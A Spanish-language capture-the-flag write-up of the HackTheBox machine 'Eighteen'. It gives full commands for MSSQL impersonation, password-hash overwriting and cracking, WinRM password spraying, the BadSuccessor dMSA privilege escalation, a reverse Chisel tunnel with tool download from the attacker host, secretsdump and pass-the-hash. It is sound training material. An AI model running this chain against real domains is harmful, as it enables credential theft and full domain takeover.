# Write-Up: Eighteen (HTB) - Easy 

## 📋 Tabla de Contenidos
1. [Fase de Reconocimiento](#fase-de-reconocimiento)
2. [Análisis de Puertos y Servicios](#análisis-de-puertos-y-servicios)
3. [Explotación de MSSQL](#explotación-de-mssql)
4. [Crackeo de Hash y Movimiento Lateral](#crackeo-de-hash-y-movimiento-lateral)
5. [Enumeración de Active Directory](#enumeración-de-active-directory)
6. [Explotación de BadSuccessor](#explotación-de-badsuccessor)
7. [Escalada a Domain Admin](#escalada-a-domain-admin)

---

## Fase de Reconocimiento

### 🔍 ¿Por qué empezamos con un escaneo de puertos?

El primer paso en cualquier intrusión es **entender qué servicios está corriendo la máquina víctima**. Cada puerto abierto es una potencial puerta de entrada.

```bash
sudo nmap -sS -sCV --open -p- --min-rate 5000 -n -Pn 10.129.1.131 -oN escaneo.txt
```

**Desglose del comando:**
- `-sS`: SYN scan (rápido y sigiloso, no completa la conexión TCP)
- `-sCV`: Versión de servicios + scripts básicos de enumeración
- `--open`: Solo mostrar puertos abiertos
- `-p-`: Escanear TODOS los 65535 puertos (no solo los comunes)
- `--min-rate 5000`: Enviar al menos 5000 paquetes por segundo (acelera el escaneo)
- `-n`: No resolver DNS (evita lentitud)
- `-Pn`: Saltar detección de host (asumimos que está vivo)
- `-oN escaneo.txt`: Guardar resultados en formato normal

---

## Análisis de Puertos y Servicios

### 📌 Puerto 80/TCP - HTTP (Microsoft IIS 10.0)

```
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
```

**¿Por qué es importante?**
- Es un servidor web, siempre interesante
- La redirección a `eighteen.htb` nos indica que necesitamos configurar el dominio
- IIS 10.0 sugiere Windows Server 2016/2019/2022

**Acción:** Añadimos el dominio al archivo hosts:
```bash
echo "10.129.1.131 eighteen.htb" | sudo tee -a /etc/hosts
```

**¿Por qué?** Si no hacemos esto, el navegador no sabrá resolver `eighteen.htb` y no podremos ver la página correctamente.

---

### 📌 Puerto 1433/TCP - Microsoft SQL Server

```
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.1.131:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
```

**¿Por qué este puerto es una mina de oro?**
1. **Es SQL Server**: Las bases de datos suelen contener credenciales
2. **Es el puerto por defecto** (1433) - fácil de recordar
3. **La información NTLM nos revela cosas CRÍTICAS:**
   - `Target_Name: EIGHTEEN` → Nombre del dominio
   - `NetBIOS_Computer_Name: DC01` → ¡ESTO ES UN DOMAIN CONTROLLER!
   - `DNS_Domain_Name: eighteen.htb` → Confirmación del dominio

**¿Qué significa que sea un Domain Controller (DC)?**
- Es el "rey" de la red Windows
- Controla toda la autenticación
- Guarda todos los hashes de contraseñas
- Si comprometemos el DC, comprometemos TODO el dominio

---

### 📌 Puerto 5985/TCP - WinRM

```
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
```

**¿Por qué nos interesa?**
- WinRM = Windows Remote Management
- Es como SSH pero para Windows
- Si encontramos credenciales válidas, podemos obtener una shell directamente
- Puerto 5985 = HTTP (5986 sería HTTPS)

---

## Explotación de MSSQL

### 🎯 ¿Por qué atacamos MSSQL primero?

De los 3 puertos abiertos, MSSQL es el más prometedor porque:
1. **Contiene datos** (usuarios, contraseñas, información sensible)
2. **Podemos ejecutar comandos SQL** (si tenemos privilegios)
3. **HTB nos dio credenciales** para este servicio

```bash
impacket-mssqlclient 'eighteen.htb/kevin:iNa2we6haRj2gaw!@10.129.1.131'
```

**¿Qué es Impacket?** Una colección de scripts Python para interactuar con protocolos de Windows. `mssqlclient.py` nos permite conectarnos a MSSQL como si fuéramos un cliente legítimo.

---

### 🔐 Enumeración de usuarios SQL

```sql
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S', 'U', 'G') AND name NOT LIKE '##%';
```

**¿Qué estamos haciendo?**
- `sys.server_principals` = Tabla que contiene TODOS los usuarios del servidor SQL
- `type IN ('S', 'U', 'G')` = Filtramos por: SQL users (S), Windows users (U), Windows groups (G)
- `NOT LIKE '##%'` = Excluimos usuarios internos del sistema

**Resultado:**
```
name     type_desc   is_disabled   
------   ---------   -----------   
sa       SQL_LOGIN             0   
kevin    SQL_LOGIN             0   
appdev   SQL_LOGIN             0   
```

**Análisis:**
- `sa` = System Administrator (el root de SQL) - ESTÁ HABILITADO
- `kevin` = Nosotros
- `appdev` = Otro usuario

---

### 🔄 Cambio de contexto a 'appdev'

```sql
EXEC AS LOGIN = 'appdev';
```

**¿Qué es EXEC AS?** Una instrucción SQL que permite **cambiar el contexto de ejecución** a otro usuario. Es como hacer `su - appdev` en Linux.

**¿Por qué funciona?** Porque el usuario `kevin` tiene permisos para impersonar a `appdev` (malas prácticas de seguridad).

---

### 📊 Exploración de bases de datos

```sql
-- Ver todas las bases de datos
SELECT name FROM sys.databases;

-- Cambiar a la base de datos de la aplicación
USE financial_planner;

-- Ver todas las tablas
SELECT TABLE_NAME FROM information_schema.tables;

-- Ver estructura de la tabla 'users'
SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.columns WHERE TABLE_NAME = 'users';
```

**¿Qué encontramos?**
```
id         int
username   nvarchar
password_hash nvarchar
is_admin   bit
```

**¡BINGO!** La tabla `users` tiene `password_hash`. Esto es exactamente lo que buscábamos.

---

### 👤 Obteniendo el hash del admin

```sql
SELECT id, username, password_hash FROM users;
```

**Resultado:**
```
1002   admin   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
```

**¿Qué es este hash?**
- `pbkdf2:sha256:` = Algoritmo de hashing (muy seguro)
- `600000` = 600,000 iteraciones (hace el crackeo más lento)
- `AMtzteQIG7yAbZIa` = Salt (sal aleatoria)
- `0673ad...` = El hash propiamente dicho

---

## Modificación del Hash y Acceso Web

### 🎭 ¿Por qué modificar el hash en lugar de crackearlo?

Porque:
1. **Crackear PBKDF2 con 600,000 iteraciones es LENTÍSIMO**
2. **Tenemos permisos de escritura** (podemos cambiar el hash)
3. **Es más rápido** generar nuestro propio hash y ponerlo

```python
# generate_hash.py
import hashlib
import binascii

def generate_pbkdf2(password, salt="newsalt123"):
    iterations = 600000
    derived_key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), iterations)
    derived_hex = binascii.hexlify(derived_key).decode()
    return f"pbkdf2:sha256:{iterations}${salt}${derived_hex}"

password = "Password123"
hash_result = generate_pbkdf2(password)
print(f"Hash generado: {hash_result}")
```

Ejecutamos:
```bash
python3 generate_hash.py
```

**Hash generado:** `pbkdf2:sha256:600000$newsalt123$0e83734cb10c767d33deb3cf359aae3a0b28aad20cd4d04cacddbf87311cceeb`

Ahora actualizamos la base de datos:
```sql
UPDATE users SET password_hash = 'pbkdf2:sha256:600000$newsalt123$0e83734cb10c767d33deb3cf359aae3a0b28aad20cd4d04cacddbf87311cceeb' WHERE id = 1002;
```

**¿Qué acaba de pasar?** Hemos cambiado la contraseña del admin en la base de datos. Ahora podemos entrar a la web con `admin:Password123`.

---

## Crackeo del Hash Original

### ⚡ ¿Por qué ahora sí podemos crackear?

Porque ya tenemos acceso a la web, pero necesitamos movernos lateralmente a la máquina. El hash original puede ser la clave si el usuario reutiliza contraseñas.

```python
# cracker.py
#!/usr/bin/env python3
import hashlib
import binascii

def crack_pbkdf2(target_hash, wordlist_path):
    # Parsear el hash
    parts = target_hash.replace('pbkdf2:sha256:', '').split('$')
    iterations = int(parts[0])
    salt = parts[1]
    target_hash_hex = parts[2]
    
    print(f"[+] Iteraciones: {iterations}")
    print(f"[+] Salt: {salt}")
    print(f"[+] Wordlist: {wordlist_path}\n")
    
    with open(wordlist_path, 'r', encoding='latin-1') as f:
        for i, password in enumerate(f):
            password = password.strip()
            derived_key = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt.encode('utf-8'), iterations)
            current_hash = binascii.hexlify(derived_key).decode('utf-8')
            
            if current_hash == target_hash_hex:
                print(f"\n✅ CONTRASEÑA ENCONTRADA: {password}")
                return password
    return None

if __name__ == "__main__":
    target = "pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
    wordlist = "/usr/share/wordlists/rockyou.txt"
    crack_pbkdf2(target, wordlist)
```

Ejecutamos:
```bash
python3 cracker.py
```

**Resultado después de unos minutos:**
```
✅ CONTRASEÑA ENCONTRADA: iloveyou1
```

**Análisis:** La contraseña del admin de la web es `iloveyou1` (una de las más comunes en rockyou.txt).

---

## Movimiento Lateral con WinRM

### 🔍 Enumeración de usuarios del dominio

Necesitamos saber qué usuarios existen en el dominio para probar la contraseña `iloveyou1`.

```bash
netexec mssql 10.129.1.131 -u 'kevin' -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
```

**¿Qué es --rid-brute?**
- RID = Relative Identifier
- Cada usuario en Windows tiene un RID único (500=Admin, 501=Guest, etc.)
- Esta técnica enumera todos los RIDs del 500 al 10000+ para descubrir usuarios
- Funciona porque MSSQL puede consultar el Active Directory

**Resultado (relevante):**
```
1606: EIGHTEEN\jamie.dunn
1607: EIGHTEEN\jane.smith
1608: EIGHTEEN\alice.jones
1609: EIGHTEEN\adam.scott
1610: EIGHTEEN\bob.brown
```

Guardamos estos usuarios en `users.txt`.

---

### 🚪 Prueba de acceso WinRM

```bash
netexec winrm 10.129.1.131 -u users.txt -p 'iloveyou1'
```

**¿Por qué WinRM?** Porque vimos el puerto 5985 abierto. Si alguna credencial funciona, tendremos una shell.

**Resultado:**
```
WINRM       10.129.1.131    5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```

**¡BINGO!** `adam.scott` reutilizó la contraseña. Esto es increíblemente común en entornos reales.

---

### 🖥️ Obteniendo shell con Evil-WinRM

```bash
evil-winrm -i 10.129.1.131 -u adam.scott -p 'iloveyou1'
```

**¿Qué es Evil-WinRM?** Una herramienta que mejora la experiencia de WinRM, con colores, historial, subida/descarga de archivos, etc.

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> type user.txt
[FLAG DE USUARIO]
```

**Flag de usuario obtenida.** Estamos dentro del sistema.

---

## Enumeración de Active Directory

### 🔎 ¿Qué somos en el dominio?

```powershell
whoami /groups
```

**Resultado clave:**
```
EIGHTEEN\IT                           Group            S-1-5-21-1152179935-589108180-1989892463-1604
```

**¿Por qué es importante el grupo IT?**
- IT = Information Technology
- Los grupos de IT suelen tener permisos administrativos en ciertas partes del dominio
- Necesitamos entender QUÉ permisos específicos tiene este grupo

---

### 📋 Script de enumeración de OUs

Creamos un script para ver qué OUs (Unidades Organizativas) puede controlar el grupo IT.

**`GetOUsIT.ps1`** (contenido abreviado)

Ejecutamos:
```powershell
.\GetOUsIT.ps1
```

**Resultado:**
```
Identity       OUs
--------       ---
EIGHTEEN\IT    {OU=Staff,DC=eighteen,DC=htb}
```

**¿Qué significa esto?** El grupo IT tiene permisos de creación (`CreateChild`) en la OU `Staff`. Esto es CRÍTICO.

---

## Explotación de BadSuccessor

### 🧠 ¿Qué es BadSuccessor?

**BadSuccessor** es una técnica que explota una funcionalidad nueva en Windows Server 2025: las Delegated Managed Service Accounts (dMSA).

**Concepto:**
1. Un dMSA puede "heredar" los permisos de otro usuario mediante el atributo `msDS-ManagedAccountPrecededByLink`
2. Si podemos crear un dMSA en una OU donde tengamos permisos...
3. ...y lo enlazamos al Administrator...
4. ...entonces podemos obtener un ticket que nos permita actuar como Administrator

**Es como si pudiéramos crear un "hijo" que herede todos los poderes del "padre" (Administrator).**

---

### 📥 Descarga de la herramienta

En nuestra máquina atacante:
```bash
# Servimos el archivo con Python
python3 -m http.server 80
```

En la máquina víctima:
```powershell
# Descargamos la herramienta
iwr http://10.10.14.112/BadSuccessor.ps1 -o BadSuccessor.ps1
```

---

### 💥 Ejecución del exploit

```powershell
# Importamos el módulo
. .\BadSuccessor.ps1

# Ejecutamos el exploit
BadSuccessor -Mode Exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "diseo" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -Domain "eighteen.htb"
```

**Desglose del comando:**
- `-Mode Exploit`: Modo ataque
- `-Path`: La OU donde tenemos permisos
- `-Name`: Nombre del dMSA malicioso (terminará en $)
- `-DelegatedAdmin`: Nosotros (quién ejecuta)
- `-DelegateTarget`: Administrator (a quién queremos suplantar)

**Resultado:**
```
Creating dMSA at: LDAP://eighteen.htb/OU=Staff,DC=eighteen,DC=htb
Successfully created and configured dMSA 'diseo'
Object adam.scott can now impersonate Administrator
```

**¿Qué acaba de pasar?**
1. Se creó una cuenta `diseo$` (las cuentas de servicio terminan en $)
2. Se configuró `msDS-ManagedAccountPrecededByLink = Administrator`
3. Se configuró `msDS-DelegatedMSAState = 2` (estado de herencia activado)
4. `adam.scott` ahora puede solicitar tickets como `diseo$`

---

## Tunelización con Chisel

### 🌐 ¿Por qué necesitamos un túnel?

Porque el ataque Kerberos debe originarse desde la red interna. La máquina víctima está dentro del dominio, nosotros estamos fuera. Necesitamos hacer que nuestro tráfico parezca que viene de la máquina víctima.

**Solución:** Crear un túnel SOCKS5 con Chisel.

En la máquina atacante (servidor):
```bash
./chisel server -p 7777 --reverse
```

**¿Qué hace?** Escucha en el puerto 7777 y acepta conexiones reversas de clientes.

En la máquina víctima (cliente):
```powershell
.\chisel.exe client 10.10.14.112:7777 R:socks
```

**¿Qué hace?** Se conecta a nuestro servidor y crea un túnel. Todo el tráfico que enviemos a nuestro proxy SOCKS5 (puerto 1080 por defecto) será encaminado a través de la máquina víctima.

Configuramos proxychains:
```bash
# /etc/proxychains4.conf
socks5 127.0.0.1 1080
```

---

## Obtención del Ticket de Servicio

### 🎫 Solicitud del TGS

```bash
proxychains -q /root/.local/bin/getST.py eighteen.htb/adam.scott:iloveyou1 -impersonate 'diseo$' -dc-ip 10.129.1.131 -self -dmsa
```

**Desglose:**
- `proxychains -q`: Enruta el tráfico por el túnel
- `getST.py`: Herramienta de Impacket para obtener Service Tickets
- `-impersonate 'diseo$'`: Queremos un ticket como `diseo$`
- `-self -dmsa`: Parámetros específicos para el ataque BadSuccessor

**Resultado:**
```
[*] Saving ticket in diseo$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

**¿Qué es un .ccache?** Es el formato de archivo que usa Kerberos para guardar tickets.

```bash
# Configuramos la variable de entorno para usar este ticket
export KRB5CCNAME=diseo\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

---

### ✅ Verificación del ticket

```bash
proxychains -q netexec smb 10.129.1.131 -k --use-kcache -X 'whoami'
```

**Resultado:**
```
SMB         10.129.1.131    445    DC01             [+] eighteen.htb\diseo$ from ccache (Pwn3d!)
SMB         10.129.1.131    445    DC01             eighteen\diseo$
```

**¡Funciona!** Estamos ejecutando comandos como `diseo$`, que hereda los permisos de Administrator.

---

## Dump de Hashes y Root

### 💾 Extracción de hashes del DC

```bash
proxychains -q impacket-secretsdump -k -no-pass DC01.eighteen.htb -just-dc-user Administrator
```

**¿Qué hace secretsdump?** Utiliza la técnica DRSUAPI para extraer hashes del NTDS.dit (la base de datos de Active Directory).

**Resultado:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_DEL_ADMIN]:::
```

**Formato del hash:** `LMHash:NTHash`
- `aad3b435b51404eeaad3b435b51404ee` = LM hash vacío (moderno)
- `[NTLM_HASH_DEL_ADMIN]` = NTLM hash (el que usaremos)

---

### 🔑 Pass-the-Hash con Evil-WinRM

```bash
evil-winrm -i 10.129.1.131 -u Administrator -H '[NTLM_HASH_DEL_ADMIN]'
```

**¿Qué es Pass-the-Hash?** En lugar de usar una contraseña, usamos directamente el hash NTLM para autenticarnos. Windows acepta esto por diseño.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
[FLAG DE ROOT]
```

**¡DOMINIO COMPROMETIDO!**

---

## Resumen del Ataque

1. **Reconocimiento**: Escaneo de puertos revela MSSQL, HTTP y WinRM
2. **Acceso inicial**: Credenciales de HTB nos dan acceso a MSSQL
3. **Escalada en DB**: Cambio a usuario `appdev` con más privilegios
4. **Manipulación de DB**: Cambiamos hash del admin para acceder a la web
5. **Crackeo**: Obtenemos `iloveyou1` del hash original
6. **Movimiento lateral**: `adam.scott` reutiliza la contraseña → shell con WinRM
7. **Enumeración AD**: Descubrimos que grupo IT tiene permisos en OU Staff
8. **Explotación AD**: BadSuccessor crea dMSA malicioso que hereda de Administrator
9. **Tunelización**: Chisel para encaminar tráfico Kerberos
10. **Dump de hashes**: Secretsdump extrae hash de Administrator
11. **Root**: Pass-the-Hash con Evil-WinRM

---

## Lecciones Aprendidas

1. **Nunca reutilices contraseñas** (admin web y adam.scott usaban la misma)
2. **Principio de mínimo privilegio** en bases de datos (kevin no debería poder impersonar a appdev)
3. **Protege los hashes de contraseñas** con algoritmos fuertes (aunque PBKDF2 es fuerte, iloveyou1 es débil)
4. **Audita permisos en Active Directory** regularmente (grupo IT no debería tener permisos de creación en OUs)
5. **Windows Server 2025 trae nuevas funcionalidades** (dMSA) que pueden ser explotadas
